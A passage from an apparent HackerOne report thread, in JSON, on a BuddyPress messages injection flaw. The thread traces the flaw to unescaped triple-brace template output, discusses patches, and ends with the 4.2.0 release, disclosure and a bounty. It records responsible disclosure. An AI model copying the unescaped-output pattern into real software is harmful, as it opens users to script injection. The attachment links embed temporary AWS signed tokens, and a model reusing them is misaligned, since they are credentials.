this.\u003c/p\u003e\n\n\u003cp\u003eThanks again,\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-01T05:30:41.761Z","updated_at":"2019-02-01T05:30:41.761Z","actor":{"username":"klmunday","cleared":false,"url":"/klmunday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/480/267/c2322c402151db1b8a6b7474b47bfc4b1c415b4a_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4088061,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI have done some more digging and have discovered that this is only an issue with the Nouveau Template pack and is not present in the Legacy pack.\n\nI found that by changing `{{{data.content}}}` to `{{data.content}}` in `common/js-templates/messages/index.php` causes the message contents to be rendered as plaintext within the messages. However, since the Editor uses html tags for its markdown (and all the messages are wrapped in \u003cp\u003e tags) I found this to not be a sufficient solution. \n\nI will let you know if I find anything else\n\nHope all is well,\n-KLMunday","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI have done some more digging and have discovered that this is only an issue with the Nouveau Template pack and is not present in the Legacy pack.\u003c/p\u003e\n\n\u003cp\u003eI found that by changing \u003ccode\u003e{{{data.content}}}\u003c/code\u003e to \u003ccode\u003e{{data.content}}\u003c/code\u003e in \u003ccode\u003ecommon/js-templates/messages/index.php\u003c/code\u003e causes the message contents to be rendered as plaintext within the messages. However, since the Editor uses html tags for its markdown (and all the messages are wrapped in \u0026lt;p\u0026gt; tags) I found this to not be a sufficient solution. \u003c/p\u003e\n\n\u003cp\u003eI will let you know if I find anything else\u003c/p\u003e\n\n\u003cp\u003eHope all is well,\u003cbr\u003e\n-KLMunday\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-03T20:19:25.217Z","updated_at":"2019-02-03T20:19:25.217Z","actor":{"username":"klmunday","cleared":false,"url":"/klmunday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/480/267/c2322c402151db1b8a6b7474b47bfc4b1c415b4a_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4112225,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @klmunday,\n\nThanks for the update. Our team ended at a similar, but slightly changed, end result.\n\nIn addition to the bracket changes in the template output, we've also removed some calls to `html_entity_decode()`, as a way to reverse the problem without breaking existing installations.\n\nI've attached the patch, which we've tested and confirmed fixes the issue as we understand it.\n\nIf you agree this adequately addresses your findings, our goal would be to release an update to BuddyPress next week, or the early part of the week after next.\n\nThank you again, and talk soon","markdown_message":"\u003cp\u003eHey \u003ca href=\"/klmunday\"\u003e@klmunday\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for the update. Our team ended at a similar, but slightly changed, end result.\u003c/p\u003e\n\n\u003cp\u003eIn addition to the bracket changes in the template output, we\u0026#39;ve also removed some calls to \u003ccode\u003ehtml_entity_decode()\u003c/code\u003e, as a way to reverse the problem without breaking existing installations.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve attached the patch, which we\u0026#39;ve tested and confirmed fixes the issue as we understand it.\u003c/p\u003e\n\n\u003cp\u003eIf you agree this adequately addresses your findings, our goal would be to release an update to BuddyPress next week, or the early part of the week after next.\u003c/p\u003e\n\n\u003cp\u003eThank you again, and talk soon\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-07T22:55:03.760Z","updated_at":"2019-02-07T22:55:03.760Z","actor":{"username":"jjj","cleared":false,"url":"/jjj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/063/b21324cc7d9861888c1ddd4fa345cda6612361ff_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":420038,"filename":"bp-nouveau-messages-sanitization-2_diff.diff","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/420/038/ee60a7c8b94361573a4707d2c74ebe8c49a923ab/bp-nouveau-messages-sanitization-2_diff.diff?response-content-disposition=attachment%3B%20filename%3D%22bp-nouveau-messages-sanitization-2_diff.diff%22%3B%20filename%2A%3DUTF-8%27%27bp-nouveau-messages-sanitization-2_diff.diff\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060626Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=84d101d12512b884700cf2df1ec591916145e72f790c87943f0b4c0aaa5a2e75"}],"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4112477,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @jjj\n\nHappy to say I can't find any way to break this.\nI am happy with this as a solution\n\nThanks again","markdown_message":"\u003cp\u003eHello \u003ca href=\"/jjj\"\u003e@jjj\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eHappy to say I can\u0026#39;t find any way to break this.\u003cbr\u003e\nI am happy with this as a solution\u003c/p\u003e\n\n\u003cp\u003eThanks again\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-08T00:45:22.770Z","updated_at":"2019-02-08T00:45:22.770Z","actor":{"username":"klmunday","cleared":false,"url":"/klmunday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/480/267/c2322c402151db1b8a6b7474b47bfc4b1c415b4a_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4112832,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I may have spoke too soon, it seems you can inject some html into the Subject now, I can seem to get \u003cb\u003e and \u003ci\u003e working fine, possibly others though\n\nWas an easy fix though, just change all uses of `{{{data.subject}}}` to `{{data.subject}}` in `messages/index.php`\nDoesn't seem to break anything - not sure if it was intended to be changed\n\nSeems all fine with that change","markdown_message":"\u003cp\u003eI may have spoke too soon, it seems you can inject some html into the Subject now, I can seem to get \u0026lt;b\u0026gt; and \u0026lt;i\u0026gt; working fine, possibly others though\u003c/p\u003e\n\n\u003cp\u003eWas an easy fix though, just change all uses of \u003ccode\u003e{{{data.subject}}}\u003c/code\u003e to \u003ccode\u003e{{data.subject}}\u003c/code\u003e in \u003ccode\u003emessages/index.php\u003c/code\u003e\u003cbr\u003e\nDoesn\u0026#39;t seem to break anything - not sure if it was intended to be changed\u003c/p\u003e\n\n\u003cp\u003eSeems all fine with that change\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-08T01:13:52.967Z","updated_at":"2019-02-08T01:16:10.406Z","actor":{"username":"klmunday","cleared":false,"url":"/klmunday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/480/267/c2322c402151db1b8a6b7474b47bfc4b1c415b4a_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4151147,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Inviting HackerOne user foobar7, as he's reported a duplicate of this same issue.\n\nAs a general update to all participants, @boonebgorges will be taking over communication here, as he's been largely responsible for researching and patching this issue behind the scenes.\n\nThank you very much again for your continued patience.\n-JJJ","markdown_message":"\u003cp\u003eInviting HackerOne user foobar7, as he\u0026#39;s reported a duplicate of this same issue.\u003c/p\u003e\n\n\u003cp\u003eAs a general update to all participants, \u003ca href=\"/boonebgorges\"\u003e@boonebgorges\u003c/a\u003e will be taking over communication here, as he\u0026#39;s been largely responsible for researching and patching this issue behind the scenes.\u003c/p\u003e\n\n\u003cp\u003eThank you very much again for your continued patience.\u003cbr\u003e\n-JJJ\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-14T17:49:51.157Z","updated_at":"2019-02-14T17:49:51.157Z","actor":{"username":"jjj","cleared":false,"url":"/jjj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/063/b21324cc7d9861888c1ddd4fa345cda6612361ff_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4151153,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-14T17:50:53.413Z","updated_at":"2019-02-14T17:50:53.413Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4168498,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi all -\n\nI'm attaching an updated patch addressing the issue.\n\n@klmunday You are correct that the previous patch allowed for some HTML to be passed into Subject lines. This was not a security vulnerability, as this markup was validated using a tag whitelist and `wp_kses`. However, it was an unintended and undesirable change in behavior. As such, the updated patch strips HTML tags altogether in the subject and excerpt contexts. In addition, there are some changes in the patch related to the way that the avatar URL is returned from the AJAX endpoints; these changes don't address any vulnerabilities that we're aware of, but they make our character handling more transparent and consistent with the other changes in the patch.\n\nThe current plan is to ship a BuddyPress security and maintenance release later this week, which will include the fix. @klmunday and @foobar7 If you'd like to be cited in the release post, please let me know what name and/or link to use. See https://buddypress.org/2018/01/buddypress-2-9-3-security-and-maintenance-release/ for a past example.","markdown_message":"\u003cp\u003eHi all -\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m attaching an updated patch addressing the issue.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/klmunday\"\u003e@klmunday\u003c/a\u003e You are correct that the previous patch allowed for some HTML to be passed into Subject lines. This was not a security vulnerability, as this markup was validated using a tag whitelist and \u003ccode\u003ewp_kses\u003c/code\u003e. However, it was an unintended and undesirable change in behavior. As such, the updated patch strips HTML tags altogether in the subject and excerpt contexts. In addition, there are some changes in the patch related to the way that the avatar URL is returned from the AJAX endpoints; these changes don\u0026#39;t address any vulnerabilities that we\u0026#39;re aware of, but they make our character handling more transparent and consistent with the other changes in the patch.\u003c/p\u003e\n\n\u003cp\u003eThe current plan is to ship a BuddyPress security and maintenance release later this week, which will include the fix. \u003ca href=\"/klmunday\"\u003e@klmunday\u003c/a\u003e and \u003ca href=\"/foobar7\"\u003e@foobar7\u003c/a\u003e If you\u0026#39;d like to be cited in the release post, please let me know what name and/or link to use. See \u003ca title=\"https://buddypress.org/2018/01/buddypress-2-9-3-security-and-maintenance-release/\" href=\"/redirect?url=https%3A%2F%2Fbuddypress.org%2F2018%2F01%2Fbuddypress-2-9-3-security-and-maintenance-release%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://buddypress.org/2018/01/buddypress-2-9-3-security-and-maintenance-release/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for a past example.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-18T15:52:34.378Z","updated_at":"2019-02-18T15:52:34.378Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":426070,"filename":"bp-messages-xss.diff","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/426/070/1ae9e04c6ccf1e0ab8e43a1cdd1d4372ff59cb2d/bp-messages-xss.diff?response-content-disposition=attachment%3B%20filename%3D%22bp-messages-xss.diff%22%3B%20filename%2A%3DUTF-8%27%27bp-messages-xss.diff\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060626Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=47d80cb07f65308f8e71adbb3e30188ca55f513038e201f50fb2d0f26622c6f1"}],"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4170124,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @boonebgorges,\n\nTested the patch and it works perfectly,\nah yeah I always forget about `wp_kses`\n\nPlease cite me as [Kieran Munday](www.klmunday.com)\n\nThanks again!\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/boonebgorges\"\u003e@boonebgorges\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eTested the patch and it works perfectly,\u003cbr\u003e\nah yeah I always forget about \u003ccode\u003ewp_kses\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003ePlease cite me as \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.klmunday.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eKieran Munday\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-18T23:16:35.080Z","updated_at":"2019-02-18T23:16:35.080Z","actor":{"username":"klmunday","cleared":false,"url":"/klmunday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/480/267/c2322c402151db1b8a6b7474b47bfc4b1c415b4a_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4172621,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @boonebgorges,\n\nyou can cite me as Tim Coen (https://security-consulting.icu/). \n\nThanks!\nTim","markdown_message":"\u003cp\u003eHi \u003ca href=\"/boonebgorges\"\u003e@boonebgorges\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eyou can cite me as Tim Coen (\u003ca title=\"https://security-consulting.icu/\" href=\"/redirect?url=https%3A%2F%2Fsecurity-consulting.icu%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://security-consulting.icu/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). \u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\nTim\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-19T12:14:04.105Z","updated_at":"2019-02-19T12:14:04.105Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4180649,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi all - BuddyPress 4.2.0 has been released, and includes a fix for this issue. Thanks to both of you for coordinating with our team. https://buddypress.org/2019/02/buddypress-4-2-0-maintenance-and-security-release/","markdown_message":"\u003cp\u003eHi all - BuddyPress 4.2.0 has been released, and includes a fix for this issue. Thanks to both of you for coordinating with our team. \u003ca title=\"https://buddypress.org/2019/02/buddypress-4-2-0-maintenance-and-security-release/\" href=\"/redirect?url=https%3A%2F%2Fbuddypress.org%2F2019%2F02%2Fbuddypress-4-2-0-maintenance-and-security-release%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://buddypress.org/2019/02/buddypress-4-2-0-maintenance-and-security-release/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-20T16:10:26.520Z","updated_at":"2019-02-20T16:10:26.520Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4224075,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Boone,\nThat is great news!\nIf it is fine with both of you, when this is Resolved would it be possible to have full disclosure?\n\nThanks,\nKieran","markdown_message":"\u003cp\u003eHi Boone,\u003cbr\u003e\nThat is great news!\u003cbr\u003e\nIf it is fine with both of you, when this is Resolved would it be possible to have full disclosure?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nKieran\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-27T14:12:19.966Z","updated_at":"2019-02-27T14:12:19.966Z","actor":{"username":"klmunday","cleared":false,"url":"/klmunday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/480/267/c2322c402151db1b8a6b7474b47bfc4b1c415b4a_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4224279,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Yes, that sounds good. Thanks!","markdown_message":"\u003cp\u003eYes, that sounds good. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-27T14:59:52.963Z","updated_at":"2019-02-27T14:59:52.963Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"klmunday","url":"/klmunday"},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4232431,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"HI @klmunday ,\n\nI'm not sure if the question was also directed at me,  but from my side you can go ahead and disclose this report.\n\nBest,\nTim","markdown_message":"\u003cp\u003eHI \u003ca href=\"/klmunday\"\u003e@klmunday\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m not sure if the question was also directed at me,  but from my side you can go ahead and disclose this report.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nTim\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-28T22:16:05.146Z","updated_at":"2019-02-28T22:16:05.146Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4288652,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-08T20:29:46.954Z","updated_at":"2019-03-08T20:29:46.954Z","first_to_agree":true,"actor":{"username":"klmunday","cleared":false,"url":"/klmunday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/480/267/c2322c402151db1b8a6b7474b47bfc4b1c415b4a_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4289193,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-08T22:28:04.316Z","updated_at":"2019-03-08T22:28:04.316Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4289194,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-08T22:28:04.401Z","updated_at":"2019-03-08T22:28:04.401Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4387747,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-25T16:53:54.940Z","updated_at":"2019-03-25T16:53:54.940Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"WordPress"}},"bounty_amount":"450.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"wordpress","collaborator":{"username":"klmunday","url":"/klmunday"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4387795,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty!","markdown_message":"\u003cp\u003eThanks for the bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-25T16:59:56.007Z","updated_at":"2019-03-25T16:59:56.007Z","actor":{"username":"klmunday","cleared":false,"url":"/klmunday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/480/267/c2322c402151db1b8a6b7474b47bfc4b1c415b4a_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}